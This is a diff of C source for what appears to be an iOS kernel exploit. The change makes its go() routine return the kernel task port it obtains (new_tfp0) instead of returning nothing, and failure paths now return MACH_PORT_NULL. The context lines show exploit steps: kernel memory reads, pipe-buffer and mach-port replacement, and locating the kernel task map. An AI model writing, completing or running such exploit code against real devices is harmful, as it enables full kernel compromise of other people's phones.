@@ -580,7 +580,7 @@ uint64_t rk64(uint64_t kaddr) {
   return full;
 }
 
-void go() {
+mach_port_t go() {
   offsets_init();
   
   // increase the limit on the number of open files:
@@ -698,13 +698,13 @@ void go() {
   int replacer_pipe = find_replacer_pipe(&msg_contents);
   if (replacer_pipe == -1) {
     printf("failed to get a pipe buffer over a port\n");
-    return;
+    return MACH_PORT_NULL;
   }
   
   // does the pipe buffer contain the mach message we sent to ourselves?
   if (msg_contents == NULL) {
     printf("didn't get any message contents\n");
-    return;
+    return MACH_PORT_NULL;
   }
   
   printf("this should be the empty prealloc message\n");
@@ -749,7 +749,7 @@ void go() {
   
   if (replacer_port == MACH_PORT_NULL) {
     printf("failed to find replacer port\n");
-    return;
+    return MACH_PORT_NULL;
   }
   
   printf("found replacer port\n");
@@ -838,7 +838,7 @@ void go() {
   
   if (kernel_vm_map == 0) {
     printf("unable to find the kernel task map\n");
-    return;
+    return MACH_PORT_NULL;
   }
   
   printf("kernel map:%016llx\n", kernel_vm_map);
@@ -964,5 +964,6 @@ void go() {
   
   // that should have cleared everything up!
   printf("done!\n");
+    return new_tfp0;
 }
 
